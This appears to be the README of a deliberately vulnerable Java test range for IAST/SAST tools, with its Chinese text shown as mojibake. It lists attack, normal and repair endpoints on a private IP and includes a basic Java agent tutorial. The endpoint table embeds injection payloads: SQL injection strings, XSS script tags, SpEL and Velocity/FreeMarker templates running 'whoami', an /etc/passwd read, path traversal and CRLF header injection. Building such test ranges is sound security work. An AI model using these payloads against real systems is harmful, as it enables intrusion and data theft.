|      CVE-2019-12384       |                jackson-databind ååºåˆ—åŒ–æ¼æ´                 |    æ¼æ´    |                                                   |
|     druid_authorized      |                       druidæœªæˆæƒæ¼æ´                        |    ä¿®å¤    |                                                   |
|    druid_unauthorized     |                       druidæœªæˆæƒæ¼æ´                        |    æ¼æ´    |                                                   |
|        fastjson-*         |                 å„ä¸ªç‰ˆæœ¬fastjsonååºåˆ—åŒ–æ¼æ´                 |    æ¼æ´    |                                                   |
|         Hibernate         |                      Hibernate æ³¨å…¥æ¼æ´                      | ä¿®å¤ã€æ¼æ´ |                                                   |
|          HSQLDB           |                       HSQLDB æ³¨å…¥æ¼æ´                        | ä¿®å¤ã€æ¼æ´ |                                                   |
|            jsp            |                                                              | **æœªå®Œæˆ** |                  jspç‰ˆçš„base_vul                  |
|         log4jvul          |                         log4j2 æ¼æ´                          |    æ¼æ´    |                                                   |
|  microservice-*-service   |                          åˆ†å¸ƒå¼æœåŠ¡                          |  æ€§èƒ½æµ‹è¯•  |            ç”¨äºéªŒè¯åˆ†å¸ƒå¼å¾®æœåŠ¡çš„æ€§èƒ½             |
|         wxpay-xxe         |                       å¾®ä¿¡æ”¯ä»˜XXEæ¼æ´                        |    æ¼æ´    |                                                   |
|         logic_vul         |                        ä¸šåŠ¡é€»è¾‘æ¼æ´ï¼š                        |            |                                                   |
|                           |                                                              |            |                                                   |
|                           |                                                              |            |                                                   |
|                           |                                                              |            |                                                   |





## è¿è¡Œ

è®¿é—®ï¼š`http://å®¿ä¸»æœºIP:5000/`

æˆ‘é…ç½®äº†ä¸‰ç§æ¨¡å¼ï¼š

- æ”»å‡»ï¼šå‘é€ä¸€äº›payloadï¼Œè§¦å‘æ¼æ´
- æ­£å¸¸ï¼šæœ‰å¯èƒ½æ˜¯æ¼æ´ï¼Œä½†æ˜¯å‘é€æ˜¯æ­£å¸¸çš„æ•°æ®
- ä¿®å¤ï¼šæ¼æ´å·²ç»ä¿®å¤ï¼Œä½†æ˜¯payloadä¸ç”Ÿæ•ˆï¼ˆè¿‡æ»¤æˆ–è€…æŠ¥é”™ï¼‰
- è¯¯æŠ¥ï¼šIASTæˆ–SASTè¯¯æŠ¥æ£€æµ‹çš„å®‰å…¨æ¼æ´

å…¶ä¸­å³è¾¹æµ‹è¯•æŒ‰é’®ï¼Œå¯ä»¥å¯¹è¿™ä¸ªæ¥å£è¿›è¡Œç”¨ä¾‹æµ‹è¯•ã€‚

![image-20240306164920221](.gitbook/assets/image-20240306164920221.png)

ä¹Ÿå¯ä»¥è‡ªå®šä¹‰å‘é€payloadï¼Œè¿›è¡Œè°ƒè¯•

![image-20240306165001240](.gitbook/assets/image-20240306165001240.png)

ä¹Ÿå¯ä»¥æ‰¹é‡å‘é€è¯·æ±‚ï¼Œå„ä¸ªæ¼æ´çš„å›æ˜¾ï¼Œä¼šåœ¨ä¸‹é¢æ˜¾ç¤ºã€‚

![image-20240127215349622](.gitbook/assets/image-20240127215349622.png)



## SimpleAgent

Java Agent æ˜¯ä¸€ç§å·¥å…·ï¼Œå®ƒå¯ä»¥ä½¿ç”¨ Java Instrumentation API åœ¨è¿è¡Œæ—¶ä¿®æ”¹å­—èŠ‚ç ã€‚ä¸€ä¸ªéå¸¸ç®€å•çš„ Java Agent å¯ä»¥ä»…ä»…è®°å½•ä¸€ä¸ªæ¶ˆæ¯ï¼Œä»¥è¡¨æ˜å®ƒå·²è¢«åŠ è½½ã€‚

é¦–å…ˆï¼Œåˆ›å»º Agent ç±» `SimpleAgent.java`ï¼š

```java
package my.agent;

import java.lang.instrument.Instrumentation;

public class SimpleAgent {
    public static void premain(String agentArgs, Instrumentation inst) {
        System.out.println(""SimpleAgent å·²åŠ è½½"");
    }
}
```

åœ¨è¿™æ®µä»£ç ä¸­ï¼Œ`premain` æ–¹æ³•æ˜¯ Java Agent çš„å…¥å£ç‚¹ã€‚å®ƒåœ¨åº”ç”¨ç¨‹åºçš„ `main` æ–¹æ³•ä¹‹å‰è¢«è°ƒç”¨ã€‚

æ¥ä¸‹æ¥ï¼Œä½ éœ€è¦ä¸€ä¸ª manifest æ–‡ä»¶æ¥æŒ‡å®š Agent-Classã€‚åˆ›å»ºä¸€ä¸ªåä¸º `MANIFEST.MF` çš„æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š

```
Manifest-Version: 1.0
Premain-Class: my.agent.SimpleAgent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```

è¿™ä¸ª manifest æ–‡ä»¶æŒ‡å®šäº† agent ç±»å¹¶å¯ç”¨äº†ä¸€äº›åŠŸèƒ½ï¼Œå¦‚ç±»çš„é‡å®šä¹‰å’Œé‡è½¬æ¢ã€‚

ç°åœ¨ï¼Œå°† Java Agent ç¼–è¯‘å¹¶æ‰“åŒ…æˆ JAR æ–‡ä»¶ã€‚å‡è®¾ä½ çš„ Java æ–‡ä»¶åœ¨ `src` ç›®å½•ä¸­ï¼Œä½¿ç”¨ `javac` å’Œ `jar` å‘½ä»¤ï¼Œä½ å¯ä»¥è¿™æ ·åšï¼š

1. ç¼–è¯‘ agent ç±»ï¼š

```sh
# javac -source 1.8 -target 1.8 -d . src/main/java/my/agent/SimpleAgent.java
```

2. å°†ç¼–è¯‘åçš„ç±»æ‰“åŒ…æˆå¸¦æœ‰ manifest çš„ JAR æ–‡ä»¶ï¼š

```sh
# jar cvfm SimpleAgent.jar MANIFEST.MF my/agent/SimpleAgent.class
added manifest
adding: my/agent/SimpleAgent.class(in = 492) (out= 320)(deflated 34%)
```

ç°åœ¨ä½ æœ‰äº†ä¸€ä¸ªå¯ä»¥ä½œä¸º Java Agent ä½¿ç”¨çš„ `SimpleAgent.jar`ã€‚è¦å°†è¿™ä¸ª agent é™„åŠ åˆ°ä½ çš„åº”ç”¨ç¨‹åºä¸Šï¼Œå¯åŠ¨ Java åº”ç”¨ç¨‹åºæ—¶ä½¿ç”¨ `-javaagent` é€‰é¡¹ï¼Œå°†`SimpleAgent.jar`é‡å‘½ååˆ°`./agent/agent.jar`

```sh
# mv SimpleAgent.jar ../agent/agent.jar
```



## æ”¯æŒæµ‹è¯•çš„æ¼æ´

| æ¥å£ | æ¼æ´åå­— | è¯·æ±‚æ–¹æ³• | url | æ¥å£ç±»å‹ |
| :----------------------------------------: | :---------------------------------------------------------: | -------- | :----------------------------------------------------------: | :------: |
| druid_authorized | druidæœªæˆæƒæ¼æ´ | GET | http://192.168.0.9:9996/druid | ä¿®å¤ |
| actuator2_authorized | SpringBoot Actuatoræœªæˆæƒè®¿é—®æ¼æ´2.X | GET | http://192.168.0.9:9994/actuator | ä¿®å¤ |
| actuator1_authorized | SpringBoot Actuatoræœªæˆæƒè®¿é—®æ¼æ´1.X | GET | http://192.168.0.9:9992/trace | ä¿®å¤ |
| sql_injection_id_repair | SQLæ³¨å…¥-mybatics-æ•°å­— | GET | http://192.168.0.9:9990/users/1'/ | ä¿®å¤ |
| sql_injection_ids_repair | SQLæ³¨å…¥-mybatics-æ•°ç»„ | GET | http://192.168.0.9:9990/users/ids/?ids=1,2,3' | ä¿®å¤ |
| sql_injection_like_repair | SQLæ³¨å…¥-mybatics-likeæ¨¡ç³ŠåŒ¹é… | GET | http://192.168.0.9:9990/users/name?name=A' | ä¿®å¤ |
| sql_injection_strs_repair | SQLæ³¨å…¥-mybatics-å­—ç¬¦ä¸²æ•°ç»„ | GET | http://192.168.0.9:9990/users/names?names=Alice&names=Bob' | ä¿®å¤ |
| sql_injection_orderby_repair | SQLæ³¨å…¥-mybatics-æ’åº | GET | http://192.168.0.9:9990/users/sort?orderByColumn=name&orderByDirection=asc' | ä¿®å¤ |
| xss_reflect_htmlEscape_repair | åå°„å‹XSSæ¼æ´-htmlEscapeç±» | GET | http://192.168.0.9:9990/xss_reflect_htmlEscape?name=<script>alert(123)</script> | ä¿®å¤ |
| xss_reflect_escapeHtml4_repair | åå°„å‹XSSæ¼æ´-escapeHtml4ç±» | GET | http://192.168.0.9:9990/xss_reflect_escapeHtml4?name=<script>alert(123)</script> | ä¿®å¤ |
| xss_reflect_escapeHtml_reparir | åå°„å‹XSSæ¼æ´-htmlç¼–ç  | GET | http://192.168.0.9:9990/xss_reflect_escapeHtml?name=<script>alert(123)</script> | ä¿®å¤ |
| xss_storage_thymeleaf_reparir | å­˜å‚¨å‹XSSæ¼æ´-thymeleafæ¨¡æ¿è¿‡æ»¤ | GET | http://192.168.0.9:9990/xss_storage_thymeleaf?name=<script>alert(123)</script> | ä¿®å¤ |
| file_upload_repair | ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ | POST | http://192.168.0.9:9990/file_upload | ä¿®å¤ |
| file_read_repair | æ–‡ä»¶è¯»å–æ¼æ´ | GET | http://192.168.0.9:9990/file_read?filePath=pom.xml | ä¿®å¤ |
| file_write_repair | ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´ | GET | http://192.168.0.9:9990/file_write?fileName=test.txt&data=test | ä¿®å¤ |
| file_download_repair | ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ | GET | http://192.168.0.9:9990/file_download?fileName=../test.log | ä¿®å¤ |
| file_delete_repair | ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´ | GET | http://192.168.0.9:9990/file_delete?fileName=test.txt | ä¿®å¤ |
| runtime_command_execute_repair | å‘½ä»¤æ‰§è¡Œæ¼æ´-Runtime | GET | http://192.168.0.9:9990/runtime_command_execute?command=whoami | ä¿®å¤ |
| process_builder_command_repair | å‘½ä»¤æ‰§è¡Œæ¼æ´-ProcessBuilder | GET | http://192.168.0.9:9990/process_builder_command_execute?command=whoami | ä¿®å¤ |
| crlf_injection_repair | CRLFæ³¨å…¥ | GET | http://192.168.0.9:9990/crlf_injection?name=%0D%0ASet-Cookie: sessionid=123456 | ä¿®å¤ |
| spel_expression_repair | SPELè¡¨è¾¾å¼æ”»å‡» | GET | http://192.168.0.9:9990/spel_expression?input=T(java.lang.Runtime).getRuntime().exec('whoami') | ä¿®å¤ |
| ssrf_openStream_repair | SSRFæ”»å‡»-openStream | GET | http://192.168.0.9:9990/ssrf_openStream?url=https://www.baidu.com | ä¿®å¤ |
| ssrf_openConnection_repair | SSRFæ”»å‡»-openConnection | GET | http://192.168.0.9:9990/ssrf_openConnection?url=http://www.baidu.com | ä¿®å¤ |
| ssrf_requestGet_repair | SSRFæ”»å‡»-requestGet | GET | http://192.168.0.9:9990/ssrf_requestGet?url=http://www.baidu.com | ä¿®å¤ |
| ssrf_okhttp_repair | SSRFæ”»å‡»-okhttp | GET | http://192.168.0.9:9990/ssrf_okhttp?url=http://www.baidu.com | ä¿®å¤ |
| ssrf_defaultHttpClient_repair | SSRFæ”»å‡»-defaultHttpClient | GET | http://192.168.0.9:9990/ssrf_defaultHttpClient?url=http://www.baidu.com | ä¿®å¤ |
| ssti_velocity_repair | SSTIæ”»å‡»-velocity | GET | http://192.168.0.9:9990/ssti_velocity?content=%23set (%24exp %3d ""exp"")%3b%24exp.getClass().forName(""java.lang.Runtime"").getRuntime().exec(""whoami"") | ä¿®å¤ |
| xxe_saxparserfactory_repair | XXE-saxparserfactory | POST | http://192.168.0.9:9990/xxe_saxparserfactory | ä¿®å¤ |
| xxe_xmlreaderfactory_repair | XXE-xmlreaderfactory | POST | http://192.168.0.9:9990/xxe_xmlreaderfactory | ä¿®å¤ |
| xxe_saxbuilder_repair | XXE-saxbuilder | POST | http://192.168.0.9:9990/xxe_saxbuilder | ä¿®å¤ |
| xxe_saxreader_repair | XXE-saxreader | POST | http://192.168.0.9:9990/xxe_saxreader | ä¿®å¤ |
| xxe_documentbuilderfactory_repair | XXE-documentbuilderfactory | POST | http://192.168.0.9:9990/xxe_documentbuilderfactory | ä¿®å¤ |
| xxe_documentbuilderfactory_xinclude_repair | XXE-documentbuilderfactory_xinclude | POST | http://192.168.0.9:9990/xxe_documentbuilderfactory_xinclude | ä¿®å¤ |
| OpenRedirector_ModelAndView_repair | URLé‡å®šå‘æ¼æ´-ModelAndView | GET | http://192.168.0.9:9990/OpenRedirector_ModelAndView?url=https://www.baidu.com | ä¿®å¤ |
| OpenRedirector_sendRedirect_repair | URLé‡å®šå‘æ¼æ´-sendRedirect | GET | http://192.168.0.9:9990/OpenRedirector_sendRedirect?url=https://www.baidu.com | ä¿®å¤ |
| OpenRedirector_lacation_repair | URLé‡å®šå‘æ¼æ´-location | GET | http://192.168.0.9:9990/OpenRedirector_lacation?url=https://www.baidu.com | ä¿®å¤ |
| swagger-ui_repair | swagger-ui-æœªæˆæƒè®¿é—®æ¼æ´ | GET | http://192.168.0.9:9990/swagger-ui.html | ä¿®å¤ |
| sql_injection_Optional_repair | SQLæ³¨å…¥-Optional<String> | GET | http://192.168.0.9:9990/users/findByOptionalUsername?username=test' | ä¿®å¤ |
| sql_injection_Object_repair | SQLæ³¨å…¥-Object[] | POST | http://192.168.0.9:9990/users/get_name_object | ä¿®å¤ |
| sql_injection_Annotation_repair | SQLæ³¨å…¥-MyBatisæ³¨è§£æ–¹å¼ | GET | http://192.168.0.9:9990/users/by-username?name=test | ä¿®å¤ |
| sql_injection_lombok_repair | SQLæ³¨å…¥-lombok | POST | http://192.168.0.9:9990/users/lombok | ä¿®å¤ |
| sql_injection_hsqldb_repair | SQLæ³¨å…¥-hsqldb | GET | http://192.168.0.9:9989/hsqldb_repair?username=1' | ä¿®å¤ |
| sql_injection_Hibernate_repair | SQLæ³¨å…¥-Hibernate | GET | http://192.168.0.9:9988/Hibernate_injection_repair?username=foobar' OR (SELECT COUNT(*) FROM User)>=0 OR 'foobar'=' | ä¿®å¤ |
| log4j2_attack | Log4j2 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2021-44228ï¼‰ | POST | http://192.168.0.9:9998/log4j2 | æ”»å‡» |
| fastjson1_2_24_attack | fastjson-1.2.24ååºåˆ—æ¼æ´ | POST | http://192.168.0.9:9999/fastjson1.2.24-process | æ”»å‡» |
| fastjson1_2_25_attack | fastjson-1.2.25-1.2.47ååºåˆ—æ¼æ´-ä¸éœ€è¦AutoTypeSupport-é€šæ€ | POST | http://192.168.0.9:9987/fastjson1.2.25-process | æ”»å‡» |
| fastjson1_2_41_attack | fastjson-1.2.25-1.2.41ååºåˆ—æ¼æ´-setAutoTypeSupport | POST | http://192.168.0.9:9987/fastjson1.2.41-process-setAutoTypeSupport | æ”»å‡» |
| fastjson1_2_42_attack | fastjson-1.2.42ååºåˆ—æ¼æ´ | POST | http://192.168.0.9:9986/fastjson1.2.42-process | æ”»å‡» |
| fastjson1_2_43_attack | fastjson-1.2.43ååºåˆ—æ¼æ´ | POST | http://192.168.0.9:9985/fastjson1.2.43-process | æ”»å‡» |
| fastjson1_2_45_attack | fastjson-1.2.45ååºåˆ—æ¼æ´ | POST | http://192.168.0.9:9984/fastjson1.2.45-process | æ”»å‡» |
| fastjson1_2_59_attack_1 | fastjson-1.2.59ååºåˆ—æ¼æ´(1.2.5 <= 1.2.59)-payload1 | POST | http://192.168.0.9:9983/fastjson1.2.59-process | æ”»å‡» |
| fastjson1_2_59_attack_2 | fastjson-1.2.59ååºåˆ—æ¼æ´(1.2.5 <= 1.2.59)-payload2 | POST | http://192.168.0.9:9983/fastjson1.2.59-process | æ”»å‡» |
| fastjson1_2_60_attack_1 | fastjson-1.2.60ååºåˆ—æ¼æ´(1.2.5 <= 1.2.60)-payload1 | POST | http://192.168.0.9:9982/fastjson1.2.60-process | æ”»å‡» |
| fastjson1_2_60_attack_2 | fastjson-1.2.60ååºåˆ—æ¼æ´(1.2.5 <= 1.2.60)-payload2 | POST | http://192.168.0.9:9982/fastjson1.2.60-process | æ”»å‡» |
| fastjson1_2_61_attack_1 | fastjson-1.2.61ååºåˆ—æ¼æ´-payload1 | POST | http://192.168.0.9:9981/fastjson1.2.61-process | æ”»å‡» |
| fastjson1_2_61_attack_2 | fastjson-1.2.61ååºåˆ—æ¼æ´-payload2 | POST | http://192.168.0.9:9981/fastjson1.2.61-process | æ”»å‡» |
| fastjson1_2_62_attack_1 | fastjson-1.2.62ååºåˆ—æ¼æ´-payload1 | POST | http://192.168.0.9:9980/fastjson1.2.62-process | æ”»å‡» |
| fastjson1_2_62_attack_2 | fastjson-1.2.62ååºåˆ—æ¼æ´-payload2 | POST | http://192.168.0.9:9980/fastjson1.2.62-process | æ”»å‡» |
| fastjson1_2_66_attack_1 | fastjson-1.2.66ååºåˆ—æ¼æ´-payload1 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | æ”»å‡» |
| fastjson1_2_66_attack_2 | fastjson-1.2.66ååºåˆ—æ¼æ´-payload2 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | æ”»å‡» |
| fastjson1_2_66_attack_3 | fastjson-1.2.66ååºåˆ—æ¼æ´-payload3 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | æ”»å‡» |
| fastjson1_2_66_attack_4 | fastjson-1.2.66ååºåˆ—æ¼æ´-payload4 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | æ”»å‡» |
| fastjson1_2_66_attack_5 | fastjson-1.2.66ååºåˆ—æ¼æ´-payload5 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | æ”»å‡» |
| fastjson1_2_66_attack_6 | fastjson-1.2.66ååºåˆ—æ¼æ´-payload6 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | æ”»å‡» |
| fastjson1_2_67_attack_1 | fastjson-1.2.67ååºåˆ—æ¼æ´-payload1 | POST | http://192.168.0.9:9978/fastjson1.2.67-process | æ”»å‡» |
| fastjson1_2_67_attack_2 | fastjson-1.2.67ååºåˆ—æ¼æ´-payload2 | POST | http://192.168.0.9:9978/fastjson1.2.67-process | æ”»å‡» |
| fastjson1_2_68_attack_1 | fastjson-1.2.68ååºåˆ—æ¼æ´-payload1 | POST | http://192.168.0.9:9977/fastjson1.2.68-process | æ”»å‡» |
| fastjson1_2_68_attack_2 | fastjson-1.2.68ååºåˆ—æ¼æ´-payload2 | POST | http://192.168.0.9:9977/fastjson1.2.68-process | æ”»å‡» |
| fastjson1_2_80_attack | fastjson-1.2.80ååºåˆ—æ¼æ´ | POST | http://192.168.0.9:9976/fastjson1.2.80-process | æ”»å‡» |
| druid_unauthorized | druidæœªæˆæƒæ¼æ´ | GET | http://192.168.0.9:9997/druid | æ”»å‡» |
| actuator2_unauthorized | SpringBoot Actuatoræœªæˆæƒè®¿é—®æ¼æ´2.X | GET | http://192.168.0.9:9995/actuator | æ”»å‡» |
| actuator1_unauthorized | SpringBoot Actuatoræœªæˆæƒè®¿é—®æ¼æ´1.X | GET | http://192.168.0.9:9993/trace | æ”»å‡» |
| sql_injection_id_attack | SQLæ³¨å…¥-mybatics-æ•°å­— | GET | http://192.168.0.9:9991/users/1'/ | æ”»å‡» |
| sql_injection_ids_attack | SQLæ³¨å…¥-mybatics-æ•°ç»„ | GET | http://192.168.0.9:9991/users/ids/?ids=1,2,3' | æ”»å‡» |
| sql_injection_like_attack | SQLæ³¨å…¥-mybatics-likeæ¨¡ç³ŠåŒ¹é… | GET | http://192.168.0.9:9991/users/name?name=A' | æ”»å‡» |
| sql_injection_strs_attack | SQLæ³¨å…¥-mybatics-å­—ç¬¦ä¸²æ•°ç»„ | GET | http://192.168.0.9:9991/users/names?names=Alice&names=Bob' | æ”»å‡» |
| sql_injection_orderby_attack | SQLæ³¨å…¥-mybatics-æ’åº | GET | http://192.168.0.9:9991/users/sort?orderByColumn=name&orderByDirection=asc' | æ”»å‡» |
| sql_injection_Optional_attack | SQLæ³¨å…¥-Optional<String> | GET | http://192.168.0.9:9991/users/findByOptionalUsername?username=test' | æ”»å‡» |
| sql_injection_Object_attack | SQLæ³¨å…¥-Object<String> | POST | http://192.168.0.9:9991/users/get_name_object | æ”»å‡» |
| sql_injection_Annotation_attack | SQLæ³¨å…¥-MyBatisæ³¨è§£æ–¹å¼ | GET | http://192.168.0.9:9991/users/by-username?name=test' | æ”»å‡» |
| sql_injection_lombok_attack | SQLæ³¨å…¥-lombok | POST | http://192.168.0.9:9991/users/lombok | æ”»å‡» |
| sql_injection_hsqldb_attack | SQLæ³¨å…¥-hsqldb | GET | http://192.168.0.9:9989/hsqldb?username=1' | æ”»å‡» |
| sql_injection_Hibernate_attack | SQLæ³¨å…¥-Hibernate | GET | http://192.168.0.9:9988/Hibernate_injection?username=foobar' OR (SELECT COUNT(*) FROM User)>=0 OR 'foobar'=' | æ”»å‡» |
| xss_reflect_attack | åå°„å‹XSSæ¼æ´ | GET | http://192.168.0.9:9991/xss_reflect?name=<script>alert(123)</script> | æ”»å‡» |
| xss_storage_attack | å­˜å‚¨å‹XSSæ¼æ´ | GET | http://192.168.0.9:9991/xss_storage?name=<script>alert(123)</script> | æ”»å‡» |
| xss_dom_attack | DOM XSSæ¼æ´ | POST | http://192.168.0.9:9991/xss_dom | æ”»å‡» |
| file_upload_attack | ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ | POST | http://192.168.0.9:9991/file_upload | æ”»å‡» |
| file_read_attack | ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ | GET | http://192.168.0.9:9991/file_read?filePath=/etc/passwd | æ”»å‡» |
| file_write_attack | ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´ | GET | http://192.168.0.9:9991/file_write?fileName=test.txt&data=test | æ”»å‡» |
| file_download_attack | ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ | GET | http://192.168.0.9:9991/file_download?fileName=../pom.xml | æ”»å‡» |
| file_delete_attack | ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´ | GET | http://192.168.0.9:9991/file_delete?fileName=test.txt | æ”»å‡» |
| runtime_command_execute | å‘½ä»¤æ‰§è¡Œæ¼æ´-runtime | GET | http://192.168.0.9:9991/runtime_command_execute?command=whoami | æ”»å‡» |
| process_builder_command_execute | å‘½ä»¤æ‰§è¡Œæ¼æ´-ProcessBuilder | GET | http://192.168.0.9:9991/process_builder_command_execute?command=whoami | æ”»å‡» |
| crlf_injection_attack | CRLFæ³¨å…¥ | GET | http://192.168.0.9:9991/crlf_injection?name=%0D%0ASet-Cookie: sessionid=123456 | æ”»å‡» |
| spel_expression_attack | SPELè¡¨è¾¾å¼æ”»å‡» | GET | http://192.168.0.9:9991/spel_expression?input=T(java.lang.Runtime).getRuntime().exec('whoami') | æ”»å‡» |
| ssrf_openStream_attack | SSRFæ”»å‡»-openStream | GET | http://192.168.0.9:9991/ssrf_openStream?url=https://www.baidu.com | æ”»å‡» |
| ssrf_openConnection_attack | SSRFæ”»å‡»-openConnection | GET | http://192.168.0.9:9991/ssrf_openConnection?url=http://www.baidu.com | æ”»å‡» |
| ssrf_requestGet_attack | SSRFæ”»å‡»-requestGet | GET | http://192.168.0.9:9991/ssrf_requestGet?url=https://www.baidu.com | æ”»å‡» |
| ssrf_okhttp_attack | SSRFæ”»å‡»-okhttp | GET | http://192.168.0.9:9991/ssrf_okhttp?url=https://www.baidu.com | æ”»å‡» |
| ssrf_defaultHttpClient_attack | SSRFæ”»å‡»-defaultHttpClient | GET | http://192.168.0.9:9991/ssrf_defaultHttpClient?url=https://www.baidu.com | æ”»å‡» |
| ssti_velocity_attack | SSTIæ”»å‡»-velocity | GET | http://192.168.0.9:9991/ssti_velocity?content=%23set (%24exp %3d ""exp"")%3b%24exp.getClass().forName(""java.lang.Runtime"").getRuntime().exec(""whoami"") | æ”»å‡» |
| ssti_freemarker_attack | SSTIæ”»å‡»-freemarker | GET | http://192.168.0.9:9991/ssti_freemarker?templateContent=%3C%23assign%20ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%7B%20ex%28%22bash%20-c%20whoami%22%29%20%7D | æ”»å‡» |
| xxe_saxparserfactory_attack | XXE-saxparserfactory | POST | http://192.168.0.9:9991/xxe_saxparserfactory | æ”»å‡» |
| xxe_xmlreaderfactory_attack | XXE-xmlreaderfactory | POST | http://192.168.0.9:9991/xxe_xmlreaderfactory | æ”»å‡» |
| xxe_saxbuilder_attack | XXE-saxbuilder | POST | http://192.168.0.9:9991/xxe_saxbuilder | æ”»å‡» |
| xxe_saxreader_attack | XXE-saxreader | POST | http://192.168.0.9:9991/xxe_saxreader | æ”»å‡» |
| xxe_documentbuilderfactory_attack | XXE-documentbuilderfactory | POST | http://192.168.0.9:9991/xxe_documentbuilderfactory | æ”»å‡» |
| xxe_documentbuilderfactory_xinclude_attack | XXE-documentbuilderfactory_xinclude | POST | http://192.168.0.9:9991/xxe_documentbuilderfactory_xinclude | æ”»å‡» |
| OpenRedirector_ModelAndView_attack | URLé‡å®šå‘æ¼æ´-ModelAndView | GET | http://192.168.0.9:9991/OpenRedirector_ModelAndView?url=https://www.baidu.com | æ”»å‡» |
| OpenRedirector_sendRedirect_attack | URLé‡å®šå‘æ¼æ´-sendRedirect | GET | http://192.168.0.9:9991/OpenRedirector_sendRedirect?url=https://www.baidu.com | æ”»å‡» |
| OpenRedirector_lacation_attack | URLé‡å®šå‘æ¼æ´-location | GET | http://192.168.0.9:9991/OpenRedirector_lacation?url=https://www.baidu.com | æ”»å‡» |
| swagger-ui_attack | swagger-ui-æœªæˆæƒè®¿é—®æ¼æ´ | GET | http://192.168.0.9:9991/swagger-ui.html | æ”»å‡» |
| xxe_wxpay_attack | å¾®ä¿¡æ”¯ä»˜XXEæ¼æ´ | POST | http://192.168.0.9:9974/wxpay-xxe | æ”»å‡» |
| xstream_CVE-2019-10173 | xstream ååºåˆ—åŒ–æ¼æ´(CVE-2019-10173) | POST | http://192.168.0.9:9973/CVE-2019-10173 | æ”»å‡» |
| jackson-databind_CVE-2019-12384 | jackson-databind ååºåˆ—åŒ–æ¼æ´(CVE-2019-12384) | GET | http://192.168.0.9:9971/CVE-2019-12384 | æ”»å‡» |
| log4j2_normal | Log4j2 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2021-44228ï¼‰ | POST | http://192.168.0.9:9998/log4j2 | æ­£å¸¸ |
| fastjson_1_2_24_normal | fastjson-1.2.24ååºåˆ—æ¼æ´ | POST | http://192.168.0.9:9999/fastjson1.2.24-process | æ­£å¸¸ |
| fastjson1_2_25_normal | fastjson-1.2.25-1.2.41ååºåˆ—æ¼æ´-disableAutoTypeSupport | POST | http://192.168.0.9:9987/fastjson1.2.25-process | æ­£å¸¸ |
| fastjson1_2_41_normal | fastjson-1.2.25-1.2.41ååºåˆ—æ¼æ´-setAutoTypeSupport | POST | http://192.168.0.9:9987/fastjson1.2.41-process-setAutoTypeSupport | æ­£å¸¸ |
| fastjson1_2_42_normal | fastjson-1.2.42ååºåˆ—æ¼æ´ | POST | http://192.168.0.9:9986/fastjson1.2.42-process | æ­£å¸¸ |
| fastjson1_2_43_normal | fastjson-1.2.43ååºåˆ—æ¼æ´ | POST | http://192.168.0.9:9985/fastjson1.2.43-process | æ­£å¸¸ |
| fastjson1_2_45_normal | fastjson-1.2.45ååºåˆ—æ¼æ´ | POST | http://192.168.0.9:9984/fastjson1.2.45-process | æ­£å¸¸ |
| fastjson1_2_59_normal | fastjson-1.2.59ååºåˆ—æ¼æ´(1.2.5 <= 1.2.59) | POST | http://192.168.0.9:9983/fastjson1.2.59-process | æ­£å¸¸ |
| fastjson1_2_60_normal | fastjson-1.2.60ååºåˆ—æ¼æ´(1.2.5 <= 1.2.60) | POST | http://192.168.0.9:9982/fastjson1.2.60-process | æ­£å¸¸ |
| fastjson1_2_61_normal | fastjson-1.2.61ååºåˆ—æ¼æ´ | POST | http://192.168.0.9:9981/fastjson1.2.61-process | æ­£å¸¸ |
| fastjson1_2_62_normal | fastjson-1.2.62ååºåˆ—æ¼æ´ | POST | http://192.168.0.9:9980/fastjson1.2.62-process | æ­£å¸¸ |
| fastjson1_2_66_normal | fastjson-1.2.66ååºåˆ—æ¼æ´ | POST | http://192.168.0.9:9979/fastjson1.2.66-process | æ­£å¸¸ |
| fastjson1_2_67_normal | fastjson-1.2.67ååºåˆ—æ¼æ´ | POST | http://192.168.0.9:9978/fastjson1.2.67-process | æ­£å¸¸ |
| fastjson1_2_68_normal | fastjson-1.2.68ååºåˆ—æ¼æ´ | POST | http://192.168.0.9:9977/fastjson1.2.68-process | æ­£å¸¸ |
| fastjson1_2_80_normal | fastjson-1.2.80ååºåˆ—æ¼æ´ | POST | http://192.168.0.9:9976/fastjson1.2.80-process | æ­£å¸¸ |
| fastjson1_2_83_normal | fastjson-1.2.83-ååºåˆ—æ¼æ´ | POST | http://192.168.0.9:9975/fastjson1.2.83-process | æ­£å¸¸ |
| sql_injection_hsqldb_normal | SQLæ³¨å…¥-hsqldb | GET | http://192.168.0.9:9989/hsqldb?username=1' | æ­£å¸¸ |
| sql_injection_lombok_normal | SQLæ³¨å…¥-lombok | POST | http://192.168.0.9:9991/users/lombok | æ­£å¸¸ |
| sql_injection_longlist_normal | SQLæ³¨å…¥-longlist | POST | http://192.168.0.9:9991/users/findByIds | æ­£å¸¸ |
| sql_injection_longint_normal | SQLæ³¨å…¥-longint | POST | http://192.168.0.9:9991/users/getUserByUId | æ­£å¸¸ |
| sql_injection_jpaone_normal | SQLæ³¨å…¥-jpaone | GET | http://192.168.0.9:9991/users/jpaone?name=test | æ­£å¸¸ |
| sql_injection_jpawithAnnotations_normal | SQLæ³¨å…¥-jpawithAnnotations | GET | http://192.168.0.9:9991/users/jpawithAnnotations?name=test | æ­£å¸¸ |
| sql_injection_Annotation_normal | SQLæ³¨å…¥-MyBatisæ³¨è§£æ–¹å¼ | GET | http://192.168.0.9:9991/users/by-username?name=test | æ­£å¸¸ |
| sql_injection_id_normal | SQLæ³¨å…¥-mybatics-æ•°å­— | GET | http://192.168.0.9:9991/users/1/ | æ­£å¸¸ |
